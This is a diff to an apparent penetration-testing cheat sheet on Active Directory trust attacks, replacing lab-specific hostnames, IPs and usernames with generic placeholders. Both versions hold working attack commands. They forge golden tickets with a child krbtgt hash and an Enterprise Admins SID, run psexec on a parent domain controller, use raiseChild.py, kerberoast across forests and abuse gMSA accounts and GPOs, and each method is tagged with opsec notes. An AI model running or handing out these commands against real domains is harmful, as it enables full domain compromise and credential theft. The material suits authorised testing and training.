@@ -1,6 +1,6 @@
 # AD Trust Attacks — Child-to-Parent & Cross-Forest
 
-> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`
+> **Pre-req:** `source /opt/venvTools/bin/activate`
 
 ## Child-to-Parent Domain Escalation (Golden Ticket with SIDHistory)
 
@@ -20,19 +20,19 @@ mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
 
 # Get child domain SID
 Get-DomainSID
-# or: lookupsid.py logistics.inlanefreight.local/user@172.16.5.240 | grep "Domain SID"
+# or: lookupsid.py child.domain.local/user@<CHILD_DC_IP> | grep "Domain SID"
 
 # Get Enterprise Admins group SID from parent domain
-Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | \
+Get-DomainGroup -Domain PARENT.DOMAIN.LOCAL -Identity "Enterprise Admins" | \
   select distinguishedname,objectsid
-# or: lookupsid.py logistics.inlanefreight.local/user@172.16.5.5 | grep -B12 "Enterprise Admins"
+# or: lookupsid.py child.domain.local/user@<PARENT_DC_IP> | grep -B12 "Enterprise Admins"
 ```
 
 **Step 2a — Forge Golden Ticket (Windows / Mimikatz):**
 ```
 mimikatz # kerberos::golden \
   /user:hacker \
-  /domain:LOGISTICS.INLANEFREIGHT.LOCAL \
+  /domain:CHILD.DOMAIN.LOCAL \
   /sid:S-1-5-21-<child-domain-sid> \
   /krbtgt:<child-krbtgt-nthash> \
   /sids:S-1-5-21-<parent-domain-sid>-519 \
@@ -43,7 +43,7 @@ mimikatz # kerberos::golden \
 ```powershell
 .\Rubeus.exe golden \
   /rc4:<child-krbtgt-nthash> \
-  /domain:LOGISTICS.INLANEFREIGHT.LOCAL \
+  /domain:CHILD.DOMAIN.LOCAL \
   /sid:S-1-5-21-<child-domain-sid> \
   /sids:S-1-5-21-<parent-domain-sid>-519 \
   /user:hacker /ptt
@@ -53,18 +53,18 @@ mimikatz # kerberos::golden \
 ```bash
 ticketer.py \
   -nthash <child-krbtgt-nthash> \
-  -domain LOGISTICS.INLANEFREIGHT.LOCAL \
+  -domain CHILD.DOMAIN.LOCAL \
   -domain-sid S-1-5-21-<child-domain-sid> \
   -extra-sid S-1-5-21-<parent-domain-sid>-519 \
   hacker
 
 export KRB5CCNAME=hacker.ccache
-psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+psexec.py CHILD.DOMAIN.LOCAL/hacker@dc01.domain.local -k -no-pass -target-ip <PARENT_DC_IP>
 ```
 
 **Step 3 — Access parent DC:**
 ```
-ls \\academy-ea-dc01.inlanefreight.local\c$
+ls \\dc01.domain.local\c$
 ```
 
 ### Automated Child-to-Parent (raiseChild.py) [added: 2026-04]
@@ -76,7 +76,7 @@ ls \\academy-ea-dc01.inlanefreight.local\c$
 - **Context:** Quick automated escalation from child to parent
 - **Payload/Method:**
   ```bash
-  raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+  raiseChild.py -target-exec <PARENT_DC_IP> CHILD.DOMAIN.LOCAL/<domain_admin_user>
   ```
 
 ## Cross-Forest Trust Attacks
@@ -91,14 +91,14 @@ ls \\academy-ea-dc01.inlanefreight.local\c$
 - **Payload/Method:**
   ```powershell
   # Enumerate SPNs in trusted forest
-  Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
-  Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | \
+  Get-DomainUser -SPN -Domain TRUSTED.FOREST.LOCAL | select SamAccountName
+  Get-DomainUser -Domain TRUSTED.FOREST.LOCAL -Identity mssqlsvc | \
     select samaccountname,memberof
 
   # Kerberoast cross-forest
-  .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+  .\Rubeus.exe kerberoast /domain:TRUSTED.FOREST.LOCAL /user:mssqlsvc /nowrap
   # OR from Linux:
-  GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+  GetUserSPNs.py -request -target-domain TRUSTED.FOREST.LOCAL CURRENT.DOMAIN.LOCAL/user
   ```
 
 ### Cross-Forest Foreign Group Members (SID Filtering Bypass Research) [added: 2026-04]
@@ -111,7 +111,7 @@ ls \\academy-ea-dc01.inlanefreight.local\c$
 - **Payload/Method:**
   ```powershell
   # Find groups with members from foreign domains/forests
-  Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+  Get-DomainForeignGroupMember -Domain TRUSTED.FOREST.LOCAL
 
   # Find users who are in groups outside their own domain
   Get-DomainForeignUser
@@ -278,7 +278,7 @@ New-GPLink -Name "Backdoor" -Target \$sitePath -Server child.parent.ad
 - **Payload/Method:**
 ```powershell
 # Create gMSA (for reference — attacker finds existing ones)
-New-ADServiceAccount -Name "apache-dev" -DNSHostName "parent.ad" -PrincipalsAllowedToRetrieveManagedPassword htb-student -Enabled \$True
+New-ADServiceAccount -Name "apache-dev" -DNSHostName "parent.ad" -PrincipalsAllowedToRetrieveManagedPassword <authorized_principal> -Enabled \$True
 
 # Enumerate gMSA accounts
 .\GoldenGMSA.exe gmsainfo --domain parent.ad
@@ -519,7 +519,7 @@ Get-ADTrust -Filter *
 - **Yields:** All domain users, groups, and their SIDs including hidden/protected accounts
 - **Opsec:** Low
 - **Context:** Enumerate all RIDs in a domain to discover users, groups, and their SIDs -- useful for finding hidden/protected accounts
-- **Payload/Method:** `lookupsid.py DOMAIN.LOCAL/user@172.16.5.5`
+- **Payload/Method:** `lookupsid.py DOMAIN.LOCAL/user@<DC_IP>`
 
 ### Cross-Domain ACL Abuse — DC AddMember to Foreign Domain Group (CRTE Exam Report) [added: 2026-04]
 - **Tags:** #CrossDomain #ACLAbuse #AddMember #BloodHound #ScheduledTask #ForeignGroup #T1222
